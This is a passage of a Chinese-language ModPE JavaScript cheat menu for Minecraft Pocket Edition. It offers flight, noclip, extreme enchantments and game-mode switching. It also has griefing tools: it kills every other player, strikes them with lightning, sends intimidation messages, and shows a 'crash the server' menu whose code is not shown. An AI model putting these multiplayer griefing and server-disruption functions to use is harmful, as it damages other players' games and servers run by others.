                按钮.setOnClickListener(new android.view.View.OnClickListener({
                    onClick: function(v) {
                        if (功能开关[19] == 假) {
                            if (首次打开 == 真) {
                                if (首页公告 != (undefined || null)) {
                                    Menu首页()
                                } else {
                                    if (功能开关[35] == 假) {
                                        主菜单()
                                    }
                                }
                                Menu工具栏();
                                首次打开 = 假
                            } else {
                                if (功能开关[35] == 假) {
                                    主菜单()
                                }
                            }
                        } else {
                            if (首次打开 == 真) {
                                黑屏();
                                信息框("你已经被封禁！")
                            } else {
                                关闭游戏();
                            }
                        }
                    }
                }))

                按钮.setOnTouchListener(new android.view.View.OnTouchListener({
                    onTouch: function(v, e) {
                        if (功能开关[30] == 真) {
                            if (功能开关[32] == 假) {
                                功能开关[32] = 真;
                                发送消息("§b§l§o§n" + 色表[生成随机数(0, 色表.length)] + smsg.mc)
                            } else {
                                功能开关[32] = 假;
                                发送消息("§b§l§o§n" + 色表[生成随机数(0, 色表.length)] + smsg.cm)
                            }
                        }
                        switch (e.getAction()) {
                            case 0:
                                坐标x1 = e.getX();
                                坐标y1 = e.getY();
                                break;
                            case 2:
                                坐标x2 = parseInt(e.getX() - 坐标x1) * -3 / 10;
                                坐标y2 = parseInt(e.getY() - 坐标y1) * -3 / 10;
                                坐标x = 坐标x + 坐标x2;
                                坐标y = 坐标y + 坐标y2;
                                窗口.update(坐标x, 坐标y, -1, -1);
                                break;
                        }
                        return 假;
                    }
                }));
                layout.addView(按钮);
                窗口.setContentView(layout);
                窗口.setWidth(dip2px(ctx, 50));
                窗口.setHeight(dip2px(ctx, 50));
                窗口.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
                窗口.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.BOTTOM | android.view.Gravity.RIGHT, 坐标x, 坐标y);
            } catch (err) {
                调试输出(err);;
            }
        }
    }));
}

主要按钮();


function 大小(x, y) {
    return new android.widget.LinearLayout.LayoutParams(x, y);
}

var 背景颜色 = [180, 0, 0, 0, 200, 0, 0, 0],
    按钮颜色 = [200, 30, 130, 187, 200, 20, 130, 187]

var 字色 = [255, 255, 255, 255, 255, 255, 255, 255],
    文本字色 = [255, 240, 240, 240]

var 字体大小 = 12,
    文本字体大小 = 18

//信息框(JSName,"已阻止加载！\n因为代码遭到恶意篡改！\n可能被植入病毒！\n请重新下载！");


function 新增图片(mainb, b64) {
    var newb = new android.widget.ImageView(ctx);
    var 群 = android.util.Base64.decode(b64, 0);
    newb.setImageBitmap(android.graphics.BitmapFactory.decodeByteArray(群, 0, 群.length))
    newb.setLayoutParams(大小(屏幕宽度 / 3, 屏幕高度 / 3));
    mainb.addView(newb)
    return newb
}

function 新增按钮(mainb, text, type) {
    if (type == null) {
        var newb = new android.widget.Button(ctx)
        newb.setText(色(text));
        newb.setTextSize(字体大小);
        newb.setPadding(10, 10, 10, 10);
        newb.setTextColor(android.graphics.Color.argb(字色[4], 字色[5], 字色[6], 字色[7]))
        newb.setBackgroundDrawable(xxxbackg());
        mainb.addView(newb);
        return newb
    } else if (type == 假) {
        var newb = new android.widget.Button(ctx)
        var params = new android.widget.LinearLayout.LayoutParams(dip2px(ctx, 90), dip2px(ctx, 15));
        newb.setLayoutParams(params);
        newb.setPadding(0, 0, 0, 0);
        newb.setTextColor(android.graphics.Color.argb(字色[4], 字色[5], 字色[6], 字色[7]))
        newb.setBackgroundDrawable(xxxbackg());
        newb.setText(色(text));
        newb.setTextSize(10);
        mainb.addView(newb);
        return newb
    } else if (type == 真) {
        var newb = new android.widget.Button(ctx)
        var params = new android.widget.LinearLayout.LayoutParams(dip2px(ctx, 90), dip2px(ctx, 15));
        newb.setLayoutParams(params);
        newb.setPadding(0, 0, 0, 0);
        newb.setTextColor(android.graphics.Color.argb(255, 255, 255, 255))
        newb.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 0, 0)));
        newb.setText(色(text));
        newb.setTextSize(12);
        mainb.addView(newb);
        return newb
    }
}

function 新增文字(mainb, text, type, size) {
    if (size == 0) {
        size == 8
    }
    if (type == null) {
        var newt = new android.widget.TextView(ctx)
        newt.setText(色(text));
        newt.setTextSize(文本字体大小);
        newt.setTextColor(android.graphics.Color.argb(文本字色[0], 文本字色[1], 文本字色[2], 文本字色[3]))
        mainb.addView(newt);
        return newt
    } else if (type == 1) {
        var newt = new android.widget.TextView(ctx)
        newt.setText(色(text));
        newt.setTextSize(文本字体大小 / 1.5);
        newt.setTextColor(android.graphics.Color.argb(文本字色[0], 文本字色[1], 文本字色[2], 文本字色[3]))
        mainb.addView(newt);
        return newt
    } else if (type == 2) {
        var newt = new android.widget.TextView(ctx)
        newt.setText(色(text));
        newt.setTextSize(size);
        newt.setTextColor(android.graphics.Color.argb(文本字色[0], 文本字色[1], 文本字色[2], 文本字色[3]))
        mainb.addView(newt);
        return newt
    }
}

function 注释文字(mainb, text, type) {
    if (type == null) {
        var newt = new android.widget.TextView(ctx)
        newt.setText(色(text));
        newt.setTextSize(文本字体大小 / 2);
        newt.setTextColor(android.graphics.Color.argb(文本字色[0], 文本字色[1], 文本字色[2], 文本字色[3]))
        mainb.addView(newt);
        return newt
    } else if (type == 0) {
        var newt = new android.widget.TextView(ctx)
        newt.setText(色(text));
        newt.setTextSize(文本字体大小 / 1.5);
        newt.setTextColor(android.graphics.Color.argb(文本字色[0], 文本字色[1], 文本字色[2], 文本字色[3]))
        mainb.addView(newt);
        return newt
    } else if (type == 2) {
        var newt = new android.widget.TextView(ctx)
        newt.setText(色(text));
        newt.setTextSize(字体大小);
        newt.setTextColor(android.graphics.Color.argb(文本字色[0], 文本字色[1], 文本字色[2], 文本字色[3]))
        mainb.addView(newt);
        return newt
    }
}

function 分隔(mainb, type) {
    if (type == null) {
        var newt = new android.widget.TextView(ctx)
        newt.setText(null)
        newt.setTextSize(1)
        mainb.addView(newt)
        return newt
    }
}


function 主菜单() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        mainmenu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        mainmenu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        新增文字(layout, " 碎梦者").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                带名字发送消息(获取玩家名字(获取玩家实体()), info信息[6]);
            }
        }))
        注释文字(layout, 换("   v%s!", JSVer));
        注释文字(layout, "   @JSAuthor".偷梁换柱("JSAuthor", fang()));
        分隔(layout);
        分隔(layout);
        新增按钮(layout, "综合功能").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu综合功能();
            }
        }));
        分隔(layout);

        新增按钮(layout, "联机神器").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu联机神器();
            }
        }))
        分隔(layout);

        新增按钮(layout, "神奇功能").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu神器功能();
            }
        }))
        分隔(layout);

        新增按钮(layout, "游戏辅助").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu游戏辅助();
            }
        }))
        分隔(layout);

        新增按钮(layout, "炸服务器").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (包 != 白名单[2]) {
                    调试输出("使用Toolbox加载脚本可以让脚本能在服务器启用")
                }
                Menu炸服务器();
            }
        }))
        分隔(layout);

        新增按钮(layout, "实用功能").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu实用功能();
            }
        }))
        分隔(layout);

        注释文字(layout, "其他:")

        新增按钮(layout, "更多信息").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu更多信息();
            }
        }))
        分隔(layout);


        var mlayout = 制作菜单(ctx, layout);
        mainmenu.setContentView(mlayout);
        mainmenu.setWidth(dip2px(ctx, 120));
        mainmenu.setHeight(dip2px(ctx, -1));
        mainmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        mainmenu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 0), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function dip2px(ctx, dips) {
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
}

function 色(txt) {
    return new android.text.Html.fromHtml(txt)
}

function xxxbackg() {
    return new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(按钮颜色[0], 按钮颜色[1], 按钮颜色[2], 按钮颜色[3]))
}

function 制作菜单(ctx, layout) {
    var mlayout = new android.widget.RelativeLayout(ctx);
    var svParams = new android.widget.RelativeLayout.LayoutParams(android.widget.RelativeLayout.LayoutParams.FILL_PARENT, android.widget.RelativeLayout.LayoutParams.FILL_PARENT);
    var scrollview = new android.widget.ScrollView(ctx);
    var pad = dip2px(ctx, 2);
    scrollview.setPadding(pad, pad, pad, pad);
    scrollview.setLayoutParams(svParams);
    scrollview.addView(layout);
    mlayout.addView(scrollview);
    return mlayout
}

function 高级附魔(a) {
    var 级别 = 32767
    if (a == null) {
        附魔(手中物品ID(), Enchantment.FIRE_ASPECT, 级别);
        附魔(手中物品ID(), Enchantment.FIRE_PROTECTION, 级别);
        附魔(手中物品ID(), Enchantment.PROJECTILE_PROTECTION, 级别);
        附魔(手中物品ID(), Enchantment.FORTUNE, 级别);
        附魔(手中物品ID(), Enchantment.INFINITY, 级别);
        附魔(手中物品ID(), Enchantment.KNOCKBACK, 级别);
        附魔(手中物品ID(), Enchantment.SHARPNESS, 级别);
        附魔(手中物品ID(), Enchantment.AQUA_AFFINITY, 级别);;
        附魔(手中物品ID(), Enchantment.PUNCH, 级别);
        附魔(手中物品ID(), Enchantment.FLAME, 级别);
        附魔(手中物品ID(), Enchantment.BANE_OF_ARTHROPODS, 级别)
        附魔(手中物品ID(), Enchantment.RESPIRATION, 级别);
        附魔(手中物品ID(), Enchantment.SILK_TOUCH, 级别);
        附魔(手中物品ID(), Enchantment.SMITE, 级别);
        附魔(手中物品ID(), Enchantment.THORNS, 级别);
        附魔(手中物品ID(), Enchantment.UNBREAKING, 级别);
        附魔(手中物品ID(), Enchantment.FEATHER_FALLING, 级别);
        附魔(手中物品ID(), Enchantment.BLAST_PROTECTION, 级别);
        附魔(手中物品ID(), Enchantment.DEPTH_STRIDER, 级别);
        附魔(手中物品ID(), Enchantment.EFFICIENCY, 级别);
        附魔(手中物品ID(), Enchantment.LUCK_OF_THE_SEA, 级别);
        附魔(手中物品ID(), Enchantment.LURE, 级别);
        附魔(手中物品ID(), Enchantment.POWER, 级别);
        附魔(手中物品ID(), Enchantment.PROTECTION, 级别);
    } else if (a == 1) {
        for (var i = 0; i <= 9; i++) {
            附魔(i, Enchantment.FIRE_ASPECT, 级别);
            附魔(i, Enchantment.FIRE_PROTECTION, 级别);
            附魔(i, Enchantment.PROJECTILE_PROTECTION, 级别);
            附魔(i, Enchantment.FORTUNE, 级别);
            附魔(i, Enchantment.INFINITY, 级别);
            附魔(i, Enchantment.KNOCKBACK, 级别);
            附魔(i, Enchantment.SHARPNESS, 级别);
            附魔(i, Enchantment.AQUA_AFFINITY, 级别);;
            附魔(i, Enchantment.PUNCH, 级别);
            附魔(i, Enchantment.FLAME, 级别);
            附魔(i, Enchantment.BANE_OF_ARTHROPODS, 级别)
            附魔(i, Enchantment.RESPIRATION, 级别);
            附魔(i, Enchantment.SILK_TOUCH, 级别);
            附魔(i, Enchantment.SMITE, 级别);
            附魔(i, Enchantment.THORNS, 级别);
            附魔(i, Enchantment.UNBREAKING, 级别);
            附魔(i, Enchantment.FEATHER_FALLING, 级别);
            附魔(i, Enchantment.BLAST_PROTECTION, 级别);
            附魔(i, Enchantment.DEPTH_STRIDER, 级别);
            附魔(i, Enchantment.EFFICIENCY, 级别);
            附魔(i, Enchantment.LUCK_OF_THE_SEA, 级别);
            附魔(i, Enchantment.LURE, 级别);
            附魔(i, Enchantment.POWER, 级别);
            附魔(i, Enchantment.PROTECTION, 级别);
        }
    }
}


function Menu综合功能() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);

        注释文字(layout, "  综合功能:");
        新增按钮(layout, "碎梦首页").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                mainmenu.dismiss();
                Menu首页();
            }
        }))
        分隔(layout);

        新增按钮(layout, "基础功能").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                Menu基础功能();
            }
        }))
        分隔(layout);

        新增按钮(layout, "我的世界").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                Menu我的世界();
                if (已联机 == 真) {
                    调试输出("检测到这不是你的存档?")
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "休闲娱乐").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                Menu休闲娱乐();
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function explodeHook(entity, x, y, z, power, onFire) {
    if (功能开关[28] == 真) {
        preventDefault()
    }
}

function Menu我的世界() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "  我的世界:")
        新增按钮(layout, "便捷管理器").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (已联机 == 真) {
                    调试输出("检测到这不是你的存档？")
                }
                Menu便捷管理器();
            }
        }))
        分隔(layout);

        新增按钮(layout, "十八罗汉").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (玩家是否在游戏中() == 真) {
                    var 罗汉 = [];
                    for (var i = 0; i < 18; i++) {
                        罗汉[i] = Level.spawnMob(getPlayerX(), getPlayerY(), getPlayerZ(), EntityType.VILLAGER);
                    }
                    for (var i = 0; i < 17; i++) {
                        rideAnimal(罗汉[i], 罗汉[i + 1]);
                    }
                } else {
                    调试输出("你还没有进入游戏")
                }
            }
        }))
        分隔(layout);
        新增按钮(layout, "全民遭天谴").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[25] == 假) {
                    功能开关[25] = 真
                    输出JS消息("已开启天谴");
                } else {
                    功能开关[25] = 假;
                    输出JS消息("已关闭天谴");
                }
            }
        }))
        分隔(layout);
        新增按钮(layout, "火眼金睛").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[26] == 假) {
                    功能开关[26] = 真
                    输出JS消息("已开启火眼金睛");
                } else {
                    功能开关[26] = 假;
                    输出JS消息("已关闭火眼金睛");
                }
            }
        }))
        分隔(layout);
        新增按钮(layout, "雷眼电睛").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[27] == 假) {
                    功能开关[27] = 真
                    输出JS消息("已开启雷眼电睛");
                } else {
                    功能开关[27] = 假;
                    输出JS消息("已关闭雷眼电睛");
                }
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function Menu便捷管理器() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(false);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, 换("%s关闭", "<b>" + astr[11]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
            }
        }));
        分隔(layout);

        注释文字(layout, 换("%s天谴", "<b>" + astr[12]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var 玩家列表 = get全部玩家();
                for (var i = 0; i < 玩家列表.length; i++) {
                    if (玩家列表[i] != 获取玩家实体()) {
                        Level.spawnMob(Entity.getX(玩家列表[i]), Entity.getY(玩家列表[i]), Entity.getZ(玩家列表[i]), 93);
                    }
                }
            }
        }));
        分隔(layout);

        注释文字(layout, 换("%s坐骑", "<b>" + astr[12]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var 坐骑 = [Level.spawnMob(getPlayerX(), getPlayerY(), getPlayerZ(), EntityType.BAT), Level.spawnMob(getPlayerX(), getPlayerY(), getPlayerZ(), EntityType.COW)]
                rideAnimal(获取玩家实体(), 坐骑[1]);
                rideAnimal(坐骑[1], 坐骑[0]);
                Entity.addEffect(坐骑[1], 5, 666 * 1200, 100, 假, 假);
                Entity.addEffect(坐骑[1], 10, 666 * 1200, 100, 假, 假);
                Entity.addEffect(坐骑[1], 12, 666 * 1200, 100, 假, 假);
                Entity.addEffect(坐骑[1], 16, 666 * 1200, 100, 假, 假);
                Entity.addEffect(坐骑[1], 11, 666 * 1200, 100, 假, 假);
                Entity.addEffect(坐骑[0], 14, 666 * 1200, 100, 假, 假);
            }
        }));
        分隔(layout);

        注释文字(layout, 换("%s杀戮", "<b>" + astr[12]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var 玩家列表 = get全部玩家();
                for (var i = 0; i < 玩家列表.length; i++) {
                    if (玩家列表[i] != 获取玩家实体()) {
                        设置实体血量(玩家列表[i], 0);
                    }
                }
            }
        }));
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 50));
        menu.setHeight(屏幕高度 / 2);
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 0), dip2px(ctx, 20))
    } catch (err) {
        信息框("错误", err)
    }
}



function Menu基础功能() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);

        注释文字(layout, "  基础功能:");
        新增按钮(layout, "生存模式").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                设置游戏模式(0);
                输出JS消息("已设置你的游戏模式为生存模式")
            }
        }))
        分隔(layout);
        新增按钮(layout, "创造模式").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                设置游戏模式(1);
                输出JS消息("已设置你的游戏模式为创造模式")
            }
        }))
        分隔(layout);
        新增按钮(layout, "添加经验").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Player.addExp(10000)
                输出JS消息("已添加一万经验.")
            }
        }))
        分隔(layout);
        新增按钮(layout, "飞行").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                玩家是否能飞(真);
                Player.setFlying(真);
                输出JS消息("你现在可以飞了.")
            }
        }));
        分隔(layout);
        新增按钮(layout, "穿墙").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[29] == 假) {
                    功能开关[29] = 真
                    Entity.setCollisionSize(获取玩家实体(), -1, -1);
                    传送玩家(getPlayerX(), getPlayerY() + 1, getPlayerZ());
                    玩家是否能飞(真);
                    Player.setFlying(真);
                    输出JS消息("已开启穿墙.")
                } else {
                    Entity.setCollisionSize(获取玩家实体(), 0.5, 1);
                    功能开关[29] = 假
                    输出JS消息("已关闭穿墙.");
                }
            }
        }));
        分隔(layout);
        新增按钮(layout, "防爆").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[28] == 假) {
                    功能开关[28] = 真
                    输出JS消息("已开启防爆");
                } else {
                    功能开关[26] = 假;
                    输出JS消息("已关闭防爆");
                }
            }
        }))
        分隔(layout);
        新增按钮(layout, "白天").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                设置游戏时间(100);
                输出JS消息("游戏时间已更改为白天.")
            }
        }));
        分隔(layout);
        新增按钮(layout, "黑夜").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                设置游戏时间(18000);
                输出JS消息("游戏时间已更改为黑夜.")
            }
        }));
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}


function Menu工具栏() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(false);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(0);

        if (修复模式 == 真) {
            name = ["<b>" + message[6] + "</b>%s", message[5] + "%s"]
        } else {
            name = ["<b>" + astr[12] + "</b>%s", astr[11] + "%s"]
        }
        switch (功能开关[20]) {
            case 假:
                新增文字(layout, 换(name[0], 队友召唤), 1).setOnClickListener(new android.view.View.OnClickListener({
                    onClick: function(v) {
                        功能开关[20] = 真;
                        menu.dismiss();
                        Menu工具栏();
                        调试输出("团队聊天已开启");
                        联机消息类型 = 3;
                    }
                }));
                break;

            case 真:
                新增文字(layout, 换(name[1], 队友召唤), 1).setOnClickListener(new android.view.View.OnClickListener({
                    onClick: function(v) {
                        功能开关[20] = 假;
                        menu.dismiss();
                        Menu工具栏();
                        调试输出("团队聊天已关闭");
                        联机消息类型 = -1;
                    }
                }));
                break;
        }
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 85));
        menu.setHeight(dip2px(ctx, 20));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT | android.view.Gravity.TOP, dip2px(ctx, 0), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}


function 启动完毕事件() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "启动信息:");
        新增文字(layout, 包名);
        分隔(layout);
        新增按钮(layout, "软件包名").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                调试输出(ctx.getPackageName(), "抄袭废物你好");
            }
        }))
        分隔(layout);

        新增按钮(layout, "启动信息").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                信息框("脚本名称: 碎梦者\n脚本作者: Pvzlight\n脚本版本: %ver\n游戏版本: %k\n启动工具: %q".replace("%ver", JSVer).replace("%q", 包名).replace("%k", 版本));
            }
        }))
        分隔(layout);

        新增按钮(layout, "行为描述").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                信息框(包名, 包描述);
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 130));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 0), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

var 掉坑_被选中玩家 = 0;

function Menu快捷方式() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "快捷方式可以移动,你可以把他们放到你喜欢的位置.");
        分隔(layout);

        新增按钮(layout, "高级附魔").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                创建快捷方式("附", 'if(手中物品()==0||手中物品()==null){输出JS消息("你手中什么都没有,你想附魔空气?")}else{高级附魔();输出JS消息("附魔成功.")}')
            }
        }))
        分隔(layout);

        新增按钮(layout, "碎梦警告").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                创建快捷方式("碎", testFor("发送消息(astr[24]).replace(fang(),空);").偷梁换柱(fang(), 空))
            }
        }))
        分隔(layout);

        新增按钮(layout, "呼叫队友").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                创建快捷方式("呼", "带名字发送消息(获取玩家名字(获取玩家实体()),info信息[6]);")
            }
        }))
        分隔(layout);

        新增按钮(layout, "飞天遁地").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                创建快捷方式("天", "传送玩家(getPlayerX(),getPlayerY()+50,getPlayerZ());");
                创建快捷方式("地", "传送玩家(getPlayerX(),getPlayerY()-50,getPlayerZ());");
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 240), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function Menu熊房工具() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(false);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, 换("%s关闭", "<b>" + astr[11]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
            }
        }));
        分隔(layout);
        注释文字(layout, 换("%s附魔", "<b>" + astr[12]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (手中物品() == 0 || 手中物品() == null) {
                    输出JS消息("你手中什么都没有,你想附魔空气?")
                } else {
                    高级附魔();
                    输出JS消息("附魔成功.")
                }
            }
        }));
        分隔(layout);
        注释文字(layout, 换("%s穿墙", "<b>" + astr[12]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[29] == 假) {
                    功能开关[29] = 真
                    Entity.setCollisionSize(获取玩家实体(), -1, -1);
                    传送玩家(getPlayerX(), getPlayerY() + 1, getPlayerZ());
                    玩家是否能飞(真);
                    Player.setFlying(真);
                    输出JS消息("已开启穿墙.")
                } else {
                    Entity.setCollisionSize(获取玩家实体(), 0.5, 1);
                    功能开关[29] = 假
                    输出JS消息("已关闭穿墙.");
                }
            }
        }));
        分隔(layout);
        注释文字(layout, 换("%s恐吓", "<b>" + astr[12]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                发送消息(astr[24].偷梁换柱(JSAuthor, 空));
            }
        }));
        分隔(layout);
        注释文字(layout, 换("%s呼叫", "<b>" + astr[12]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                带名字发送消息(获取玩家名字(获取玩家实体()), info信息[6]);
            }
        }));
        分隔(layout);
        注释文字(layout, 换("%s飞天", "<b>" + astr[12]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
